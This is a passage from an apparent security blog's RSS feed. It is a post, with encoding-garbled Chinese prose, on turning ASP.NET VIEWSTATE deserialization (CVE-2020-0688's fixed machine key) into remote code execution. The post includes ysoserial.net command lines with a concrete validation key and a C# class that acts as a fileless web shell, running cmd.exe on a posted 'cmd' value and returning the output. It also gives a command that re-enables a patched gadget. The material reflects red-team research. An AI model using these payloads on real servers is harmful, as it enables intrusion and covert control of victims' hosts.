                <pubDate>Tue, 21 Apr 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Áé©ËΩâ ASP.NET VIEWSTATE ÂèçÂ∫èÂàóÂåñÊîªÊìä„ÄÅÂª∫Á´ãÁÑ°Ê™îÊ°àÂæåÈñÄ</title>
                <description>&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;ÈÄôÁØáÊñáÁ´†ÂëºÊáâÊàëÂú®Á†îË®éÊúÉ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; ÂàÜ‰∫´ÁöÑ‰∏ªÈ°åÔºåÂ¶Ç‰ΩïÁî®Â∞èÁº∫Èô∑‰∏ÄÊ≠•Ê≠•ÊìäÁ†¥‰ΩøÁî® ASP.NET Ê°ÜÊû∂ÊâÄÊí∞ÂØ´ÁöÑÂ†ÖÂõ∫ÁöÑÁ∂≤Á´ôÊáâÁî®Á®ãÂºèÔºåÂÖ∂‰∏≠‰πã‰∏ÄÁöÑÂÖßÂÆπÂ∞±ÊòØÈóúÊñºÊàëÂÄëÂú®Ê≠§‰πãÂâçÈÅéÂæÄÁ¥ÖÈöäÊºîÁ∑¥Â∞àÊ°à‰∏≠ÔºåÊàêÂäüÊï∏Ê¨°ÈÄèÈÅé VIEWSTATE ÁöÑÂèçÂ∫èÂàóÂåñÊîªÊìä‰∏¶Ë£ΩÈÄ†ÈÄ≤ÂÖ•ÂÖßÁ∂≤Á™ÅÁ†¥Âè£ÁöÑÂà©Áî®ÊñπÂºè‰ª•ÂèäÂøÉÂæóÔºå‰πüÂ∞±ÊòØÊ≠§ÁØáÊñáÁ´†ÁöÑ‰∏ªÈ°å„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÂÖßÊñá&quot;&gt;ÂÖßÊñá&lt;/h2&gt;

&lt;p&gt;ÊúÄËøëÂæÆËªüÁî¢ÂìÅ Exchange Server ÁàÜÂá∫‰∏ÄÂÄãÂö¥ÈáçÊºèÊ¥û CVE-2020-0688ÔºåÂïèÈ°åÁôºÁîüÁöÑÂéüÂõ†ÊòØÊØèÂè∞ Exchange Server ÂÆâË£ùÂÆåÂæåÂú®ÊüêÂÄã Component ‰∏≠ÈÉΩ‰ΩøÁî®‰∫ÜÂêå‰∏ÄÊääÂõ∫ÂÆöÁöÑ Machine KeyÔºåËÄåÁõ∏‰ø°Â§ßÂÆ∂ÈÉΩÂ∑≤Á∂ìÂæàÁÜüÊÇâÂèñÂæó Machine Key ‰πãÂæåÁöÑÂà©Áî®Â•óË∑Ø‰∫ÜÔºåÂèØ‰ª•Á´ÑÊîπ ASP.NET Form ‰∏≠ÁöÑ VIEWSTATE ÂèÉÊï∏ÂÄº‰ª•ÈÄ≤Ë°åÂèçÂ∫èÂàóÂåñÊîªÊìäÔºåÂæûËÄåÈÅîÊàê Remote Code Execution ÊéßÂà∂Êï¥Âè∞‰∏ªÊ©ü‰º∫ÊúçÂô®„ÄÇ&lt;/p&gt;

&lt;p&gt;Êõ¥Ë©≥Á¥∞ÁöÑ CVE-2020-0688 ÊºèÊ¥ûÁ¥∞ÁØÄÂèØ‰ª•ÂèÉËÄÉ ZDI blogÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â∞çÊñº VIEWSTATE exploit ÂàÜÊûêÂú®Á∂≤Ë∑Ø‰∏äÂ∑≤Á∂ìÊúâÁÑ°Êï∏ÁØáÊñáÁ´†ÈÄ≤Ë°åÊ∑±ÂÖ•ÁöÑÊé¢Ë®éÔºåÊâÄ‰ª•Âú®Ê≠§ÁØáÊñáÁ´†‰∏≠Â∞á‰∏çÂÜçÈáçË§áË¥ÖËø∞ÔºåËÄå‰ªäÂ§©‰∏ªË¶ÅÊÉ≥ËÅäËÅäÁöÑÊòØÈóúÊñº VIEWSTATE exploit Âú®Êª≤ÈÄèÊ∏¨Ë©¶‰∏≠Â¶Ç‰ΩïÈÄ≤Ë°åÂà©Áî®„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂü∫Êú¨„ÄÅÂ∏∏Ë¶ãÁöÑÊñπÂºèÊòØÁõ¥Êé•‰ΩøÁî®Â∑•ÂÖ∑ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; ÁöÑ ViewState Plugin Áî¢ÁîüÂêàÊ≥ï MAC ËàáÊ≠£Á¢∫ÁöÑÂä†ÂØÜÂÖßÂÆπÔºåTypeConfuseDelegate gadget Á∂ìÈÅé‰∏ÄÈÄ£‰∏≤ÂèçÂ∞ÑÂëºÂè´ÂæåÈ†êË®≠ÊúÉ invoke Process.Start ÂëºÂè´ cmd.exeÔºåÂ∞±ÂèØ‰ª•Ëß∏ÁôºÂü∑Ë°å‰ªªÊÑèÁ≥ªÁµ±Êåá‰ª§„ÄÇ&lt;/p&gt;

&lt;p&gt;‰æãÂ¶ÇÔºö&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate
              -c &quot;echo 123 &amp;gt; c:\pwn.txt&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áï∞Â∏∏ÁöÑ VIEWSTATE ÈÄöÂ∏∏ÊúÉÂ∞éËá¥ aspx È†ÅÈù¢ÂõûÊáâ 500 Internal Server ErrorÔºåÊâÄ‰ª•ÊàëÂÄë‰πüÁÑ°Ê≥ïÁõ¥Êé•ÂæóÁü•Êåá‰ª§Âü∑Ë°åÁöÑÁµêÊûúÔºå‰ΩÜÊó¢ÁÑ∂Êúâ‰∫Ü‰ªªÊÑèÂü∑Ë°åÔºåË¶ÅÁî® PowerShell ÂõûÂΩà Reverse Shell ÊàñÂõûÂÇ≥Êåá‰ª§ÁµêÊûúÂà∞Â§ñÈÉ®‰º∫ÊúçÂô®‰∏ä‰∏¶‰∏çÊòØ‰ª∂Èõ£‰∫ã„ÄÇ&lt;/p&gt;

&lt;p&gt;But ..&lt;/p&gt;

&lt;p&gt;Âú®Êª≤ÈÄèÊ∏¨Ë©¶ÁöÑÂØ¶Êà∞‰∏≠Ôºå‰∫ãÊÉÖÂæÄÂæÄÊ≤íÈÄôÈ∫ºÁæéÂ•Ω„ÄÇÁèæ‰ªä‰ºÅÊ•≠Ë≥áÂÆâÊÑèË≠òÈÉΩÁõ∏Â∞çÈ´òÔºåÁõÆÊ®ô‰º∫ÊúçÂô®Áí∞Â¢ÉÂá∫Áèæ‰ª•‰∏ãÂπæÁ®ÆÈôêÂà∂ÈÉΩÂ∑≤ÊòØÂ∏∏ÊÖãÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Â∞ÅÈéñÊâÄÊúâ‰∏ªÂãïÂ∞çÂ§ñÈÄ£Á∑ö&lt;/li&gt;
  &lt;li&gt;Á¶ÅÊ≠¢Êü•Ë©¢Â§ñÈÉ® DNS&lt;/li&gt;
  &lt;li&gt;Á∂≤È†ÅÁõÆÈåÑÁÑ°Ê≥ïÂØ´ÂÖ•&lt;/li&gt;
  &lt;li&gt;Á∂≤È†ÅÁõÆÈåÑÈõñÂèØÂØ´Ôºå‰ΩÜÂ≠òÂú® Website Defacement Èò≤Á¶¶Ê©üÂà∂ÔºåÊúÉËá™ÂãïÂæ©ÂéüÊ™îÊ°à&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊâÄ‰ª•ÈÄôÊôÇÂ∞±ÂèØ‰ª•ÂÖÖÂàÜÂà©Áî®Âè¶‰∏ÄÂÄã ActivitySurrogateSelectorFromFile gadget ÁöÑËÉΩÂäõÔºåÈÄôÂÄã gadget Âà©Áî®ÂëºÂè´ Assembly.Load ÂãïÊÖãËºâÂÖ• .NET ÁµÑ‰ª∂ÈÅîÊàê Remote Code ExecutionÔºåÊèõÂè•Ë©±Ë™™ÔºåÂèØ‰ª•‰ΩøÊàëÂÄëÊìÅÊúâÂú®Ëàá aspx È†ÅÈù¢Âêå‰∏ÄÂÄã Runtime Áí∞Â¢É‰∏≠Âü∑Ë°å‰ªªÊÑè .NET Ë™ûË®ÄÁ®ãÂºèÁ¢ºÁöÑËÉΩÂäõÔºåËÄå .NET È†êË®≠ÈÉΩÊúÉÂ≠òÂú®‰∏Ä‰∫õÊåáÂêëÂÖ±ÊúâË≥áÊ∫êÁöÑÂÖ®ÂüüÈùúÊÖãËÆäÊï∏ÂèØ‰ª•‰ΩøÁî®Ôºå‰æãÂ¶Ç &lt;a href=&quot;https://docs.microsoft.com/zh-tw/dotnet/api/system.web.httpcontext.current?view=netframework-4.8&quot;&gt;System.Web.HttpContext.Current&lt;/a&gt; Â∞±ÂèØ‰ª•ÂèñÂæóÁï∂‰∏ã HTTP Ë´ãÊ±Ç‰∏ä‰∏ãÊñáÁöÑÁâ©‰ª∂Ôºå‰πüÂ∞±ÂÉèÊòØÊàëÂÄëËÉΩÂà©Áî®ÂÆÉ‰æÜÂü∑Ë°åËá™Â∑±Êí∞ÂØ´ÁöÑ aspx Á∂≤È†ÅÁöÑÊÑüË¶∫Ôºå‰∏¶‰∏îÈÅéÁ®ãÂÖ®ÊòØÂú®Ë®òÊÜ∂È´î‰∏≠ÂãïÊÖãËôïÁêÜÔºåÊñºÊòØÂ∞±Á≠âÂêåÊñºÂª∫Á´ã‰∫ÜÁÑ°Ê™îÊ°àÁöÑ WebShell ÂæåÈñÄÔºÅ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂè™ÈúÄË¶Å‰øÆÊîπ -g ÁöÑÂèÉÊï∏Êàê ActivitySurrogateSelectorFromFileÔºåËÄå -c ÂèÉÊï∏ÊîæÁöÑÂ∞±‰∏çÂÜçÊòØÁ≥ªÁµ±Êåá‰ª§ËÄåÊòØÊÉ≥Âü∑Ë°åÁöÑ ExploitClass.cs C# Á®ãÂºèÁ¢ºÊ™îÊ°àÔºåÂæåÈù¢Áî® ; ÂàÜËôüÂàÜÈöîÂä†‰∏äÊâÄ‰æùË≥¥ÈúÄË¶ÅÂºïÂÖ•ÁöÑ dll„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
              -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈóúÊñºÈúÄË¶ÅÂºïÂÖ•ÁöÑ dll ÂèØ‰ª•Âú®ÂÆâË£ù‰∫Ü .NET Framework ÁöÑ Windows ‰∏ªÊ©ü‰∏äÊâæÂà∞ÔºåÂÉèÊàëÁöÑÁí∞Â¢ÉÊòØÂú®ÈÄôÂÄãË∑ØÂæë &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319&lt;/code&gt; ‰πã‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëá≥ÊñºÊúÄÈóúÈçµÁöÑ ExploitClass.cs Ë©≤Â¶Ç‰ΩïÊí∞ÂØ´Âë¢ÔºüÂ∞á‰æÜÊúÉË©¶ËëóÊèê‰∫§Áµ¶ &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt;ÔºåÂ∞±ÂèØ‰ª•Âú®ÁØÑ‰æãÊ™îÊ°àË£°ÊâæÂà∞ÂÆÉÔºåÊàñÊòØÂèØ‰ª•ÂÖàÁõ¥Êé•ÁúãÈÄôË£°Ôºö&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;E&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ClearError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/c &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardError&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseShellExecute&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StandardOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂÖ∂‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server.ClearError()&lt;/code&gt; Âíå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Response.End()&lt;/code&gt; ÈÉΩÊòØÂøÖË¶Å‰∏îÈáçË¶ÅÁöÑ‰∏ÄÊ≠•ÔºåÂõ†ÁÇ∫Áï∞Â∏∏ÁöÑ VIEWSTATE ÂøÖÁÑ∂ÊúÉ‰ΩøÂæó aspx È†ÅÈù¢ÂõûÊáâ 500 ÊàñÂÖ∂‰ªñÈùûÈ†êÊúüÁöÑ Server ErrorÔºåËÄåÂëºÂè´Á¨¨‰∏ÄÂÄãÂáΩÂºèÂèØ‰ª•ÂçîÂä©Ê∏ÖÈô§Âú®Áï∂Ââç Runtime Áí∞Â¢É‰∏ã stack ‰∏≠ÊâÄË®òÈåÑÁöÑÈåØË™§ÔºåËÄåÂëºÂè´ End() ÂèØ‰ª•ËÆì ASP.NET Â∞áÁï∂Ââç‰∏ä‰∏ãÊñáÊ®ôË®òÁÇ∫Ë´ãÊ±ÇÂ∑≤ËôïÁêÜÂÆåÊàê‰∏¶Áõ¥Êé•Â∞á Response ÂõûÊáâÁµ¶ÂÆ¢Êà∂Á´ØÔºåÈÅøÂÖçÁ®ãÂºèÁπºÁ∫åÈÄ≤ÂÖ•ÂÖ∂‰ªñ Error Handler ËôïÁêÜÂ∞éËá¥ÁÑ°Ê≥ïÂèñÂæóÊåá‰ª§Âü∑Ë°åÁöÑËº∏Âá∫ÁµêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;Âà∞ÈÄôÂÄãÊ≠•È©üÁöÑË©±ÔºåÁêÜË´ñ‰∏ä‰Ω†Âè™Ë¶ÅÈÄÅÂá∫Ë´ãÊ±ÇÊôÇÂõ∫ÂÆöÂ∏∂‰∏äÈÄôÂÄãÊÉ°ÊÑè VIEWSTATEÔºåÂ∞±ÂèØ‰ª•ÂÉèÊìç‰Ωú‰∏ÄËà¨ WebShell ‰∏ÄÊ®£Ôºö
&lt;img src=&quot;/assets/img/blog/20200311/play-with-viewstate-exploit-and-create-fileless-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÊúâÊôÇ‰πüÊúÉÂá∫ÁèæÈÄôÁ®ÆÊÉÖÂ¢ÉÔºö
&lt;img src=&quot;/assets/img/blog/20200311/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏çË´ñÊÄéÈ∫ºÊîπ Payload ÂÜçÈáçÈÄÅÊ∞∏ÈÅ†ÈÉΩÊòØÂæóÂà∞ Server ErrorÔºåÊñºÊòØÂ∞±ÈñãÂßãÊá∑ÁñëËá™Â∑±ÁöÑ‰∫∫Áîü Q_Q&lt;/p&gt;

&lt;p&gt;‰ΩÜ‰πüÂà•ÊÄ•ËëóÁÅ∞ÂøÉÔºåÂèØËÉΩÂè™ÊòØ‰Ω†ÈÅá‰∏äÁöÑÁõÆÊ®ôÊúâÂæà‰πñÂú∞ÂÆöÊúüÊõ¥Êñ∞‰∫Ü‰º∫ÊúçÂô®ËÄåÂ∑≤ÔºåÂõ†ÁÇ∫ÂæÆËªüÊõæÁÇ∫‰∫Ü ActivitySurrogateSelector ÈÄôÂÄã gadget Âä†‰∏ä‰∫Ü‰∏Ä‰∫õ patchÔºåÂ∞éËá¥ÁÑ°Ê≥ïÁõ¥Êé•Âà©Áî®ÔºåÂ•ΩÂú®ÊúâÂÖ∂‰ªñÁ†îÁ©∂ËÄÖÈ¶¨‰∏äÊèê‰æõ‰∫ÜËß£Ê±∫ÊñπÊ≥ï‰ΩøÂæóÈÄôÂÄã gadget ËÉΩÂÜçÊ¨°Ë¢´Âà©Áî®ÔºÅ&lt;/p&gt;

&lt;p&gt;Ë©≥Á¥∞Á¥∞ÁØÄÂèØ‰ª•Èñ±ËÆÄÈÄôÁØáÊñáÁ´†Ôºö&lt;a href=&quot;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&quot;&gt;Re-Animating ActivitySurrogateSelector&lt;/a&gt; By &lt;a href=&quot;https://silentbreaksecurity.com/author/nick/&quot;&gt;Nick Landers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Á∏ΩËÄåË®Ä‰πãÔºåÂ¶ÇÊûúÈÅáÂà∞‰∏äËø∞ÊÉÖÂΩ¢ÔºåÂèØ‰ª•ÂÖàÂòóË©¶Áî®‰ª•‰∏ãÊåá‰ª§Áî¢Áîü VIEWSTATE ‰∏¶ÁôºÈÄÅ‰∏ÄÊ¨°Áµ¶‰º∫ÊúçÂô®ÔºåÈ†ÜÂà©ÁöÑË©±Â∞±ËÉΩ‰ΩøÁõÆÊ®ô Runtime Áí∞Â¢É‰∏ãÁöÑ DisableActivitySurrogateSelectorTypeCheck ËÆäÊï∏ÂÄºË¢´Ë®≠ÁÇ∫ trueÔºåÈö®ÂæåÂÜçÁôºÈÄÅÁöÑ ActivitySurrogateSelector gadget Â∞±‰∏çÊúÉÂÜçÂô¥Âá∫ 500 Server Error ‰∫Ü„ÄÇ&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
              -c &quot;ignore&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â¶ÇÊûú‰∏äËø∞‰∏ÄÂàáÈÉΩÂæàÈ†ÜÂà©„ÄÅÊàêÂäüÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§‰∏¶ÂõûÂÇ≥‰∫ÜÁµêÊûúÔºåÂü∫Êú¨‰∏äÂ∞±Ë∂≥Â§†ÂÅöÂ§ßÈÉ®ÂàÜ‰∫ãÊÉÖÔºåËÄåÂâ©‰∏ãÁöÑÂ∞±ÊòØÁπºÁ∫åÁõ°ÊÉÖÁôºÊèÆ‰Ω†ÁöÑÊÉ≥ÂÉèÂäõÂêßÔºÅ&lt;/p&gt;

